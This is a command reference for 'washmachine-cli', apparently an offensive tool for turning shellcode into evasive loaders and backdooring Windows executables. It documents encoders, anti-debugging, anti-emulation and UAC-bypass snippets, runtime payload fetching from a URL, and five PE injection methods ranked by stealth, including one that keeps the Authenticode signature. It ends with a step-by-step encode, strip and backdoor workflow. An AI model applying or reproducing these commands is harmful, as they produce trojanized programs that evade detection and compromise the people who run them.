CLI Reference

Complete command reference for washmachine-cli. Every command, option, and flag documented.

Tip: Run washmachine-cli help <command> for focused terminal help. Use this page for the broader command reference and examples.

Interactive Shell

Washmachine CLI includes an interactive REPL shell. Launch it by running washmachine-cli with no arguments.

Inside the shell:

  • Tab completion for commands and options
  • Command history (up/down arrows)
  • Inline editing
  • Type help or help <command> for help
  • Type exit or quit to leave

encode

Encode shellcode via Bin2Shell and build a loader executable from a YAML template. This is not compilation — it’s the encoding pipeline that transforms raw shellcode bytes through Bin2Shell’s encoder/envelope system and then renders a C++ template with the encoded payload.

Shellcode Source (exactly one required)

OptionDescription
-s, --shellcode <file>Path to shellcode file (.bin)
--shellcode-hex <hex>Raw hex string (e.g. \xfc\x48\x83...)
-u, --shellcode-url <url>URL for web delivery mode — fetches payload at runtime

Options

OptionDefaultDescription
-t, --template <id>shellcode-minimalTemplate ID from YAML catalog. Use show templates to see available.
-e, --encoder <index>0Encoder index (0=none, 1=XOR, 2=RC4, etc.). Use show encoders to see all.
-v, --envelope <index>0Envelope index (0=none, 1=Base64, 2=Base32, etc.)
--snippet <section>=<id>Attach a snippet to a template section. Repeatable. Use show modules to see all.
--verboseShow detailed compilation output
--jsonOutput result as JSON

Snippet Selection

The --snippet flag uses the format --snippet <section>=<snippet_id> where:

  • <section> is the section key (e.g. antiemulation, guardrails, antidebugging, shellcodeexecution, psinjection, uacbypass, antianalysis, sleepobfuscation)
  • <snippet_id> is the item ID within that section

You can stack multiple snippets:

washmachine-cli encode -s payload.bin -t default \
  --snippet antiemulation=SirAllocALot \
  --snippet guardrails=domain_check \
  --snippet antidebugging=IsDebuggerPresentCheck

Use washmachine-cli show modules to see the full catalog of available sections and snippet IDs.

Examples

# Encode from a .bin shellcode file using the minimal template
washmachine-cli encode -s payload.bin -t shellcode-minimal

# Encode with XOR encoding and Base64 envelope
washmachine-cli encode -s payload.bin -e 1 -v 1 --json

# Encode from hex string with a snippet attached
washmachine-cli encode --shellcode-hex "\xfc\x48\x83..." --snippet antidebugging=IsDebuggerPresentCheck

# Encode with web delivery URL
washmachine-cli encode -u http://host/payload.bin -e 2 --verbose

# Stack multiple snippets on the default template
washmachine-cli encode -s payload.bin -t default --snippet guardrails=domain_check --snippet antidebugging=CloseHandleAntiDebug

backdoor

Inject shellcode into an existing PE file using one of five injection methods.

Required Options

OptionDescription
--pe <file>Path to target PE file
-s, --shellcode <file>Path to shellcode file (.bin)

Options

OptionDefaultDescription
-o, --output <file><input>.backdoored.exeOutput path for the patched PE
-m, --method <method>code-caveInjection method (see table below)
--section-name <name>.extraName for the new section (new-section method only)
--carrier <invoke>entry-pointHow the payload is invoked at runtime (see carrier types)
--no-remove-sigKeep the Authenticode signature
--no-patch-subsystemDo not patch the PE subsystem field
--no-patch-exitDo not patch exit behavior
--cave-min-size <n>Minimum code cave size in bytes (code-cave method)
--dry-runSimulate injection without writing output
--verboseShow detailed injection output
--jsonOutput result as JSON

Injection Methods

MethodHow It WorksStealthSize LimitArch
code-caveFinds null-byte gaps in existing sectionsHigh — no structural changesLimited by cave sizex86 / x64
new-sectionAdds a new PE section for the payloadLow — new entry in section tableUnlimitedx86 / x64
section-extExtends the last PE sectionMedium — no new header, but section growsUnlimitedx86 / x64
text-padWrites into .text VirtualSize↔RawSize paddingHigh — no structural changes, no file size changeLimited by padding gapx86 / x64
tls-callbackCreates a TLS callback that runs before mainMedium — adds TLS directory entryUnlimitedx64 only

Carrier Types

The --carrier flag controls how the injected payload is invoked at runtime:

CarrierDescription
entry-pointHijack the PE entry point — payload runs before original code (default)
tls-callbackRegister a TLS callback — executes before main, harder to trace (x64)
dll-mainHook DllMain — payload fires on DLL load (DLL targets only)
dll-exportHook a DLL export function — payload triggers when the export is called
entry-funcBackdoor a JMP/CALL instruction in the entry function

Examples

# Inject using the default code-cave method
washmachine-cli backdoor --pe target.exe -s payload.bin

# Inject via new section with a custom section name
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section --section-name .data2

# Inject via TLS callback (x64 only — runs before main)
washmachine-cli backdoor --pe target.exe -s payload.bin -m tls-callback -o backdoored.exe

# Extend the last section
washmachine-cli backdoor --pe target.exe -s payload.bin -m section-ext

# Use text padding (no file size change)
washmachine-cli backdoor --pe target.exe -s payload.bin -m text-pad

# Dry run with verbose output
washmachine-cli backdoor --pe target.exe -s payload.bin -m new-section --dry-run --verbose

# Keep Authenticode signature
washmachine-cli backdoor --pe signed.exe -s payload.bin --no-remove-sig --json

strip

Extract flat binary (.bin) shellcode from a PE file.

Arguments & Options

OptionDefaultDescription
<pe-file>Path to PE file to strip (required)
-o, --output <file><input>.binOutput path for extracted binary
-m, --mode <mode>epExtraction mode
--section <name>Section name (section mode)
--range <start:len>Byte range (range mode)
--no-trimKeep trailing null bytes
--analyzePrint PE analysis before stripping

Extraction Modes

ModeDescription
epExtract from the entry point section (default)
sectionExtract a specific section by name (requires --section)
all-execExtract all executable sections concatenated
rangeExtract a raw byte range (requires --range)

Examples

washmachine-cli strip loader.exe
washmachine-cli strip loader.exe -m section --section .text -o shellcode.bin
washmachine-cli strip loader.exe -m all-exec
washmachine-cli strip loader.exe -m range --range 0x400:512
washmachine-cli strip loader.exe --analyze --no-trim

Recommended Workflows

Encode → Strip → Backdoor Pipeline

# 1. Encode shellcode into a loader
washmachine-cli encode -s payload.bin -t shellcode-minimal -e 1

# 2. Strip the loader to flat binary
washmachine-cli strip loader.exe -o loader.bin

# 3. Inject into target PE
washmachine-cli backdoor --pe target.exe -s loader.bin -m new-section

Analysis-First Injection

# 1. Analyze the target to find injection opportunities
washmachine-cli analyze target.exe

# 2. Choose method based on analysis, inject
washmachine-cli backdoor --pe target.exe -s payload.bin -m code-cave

# 3. Verify the backdoored PE
washmachine-cli analyze target.backdoored.exe
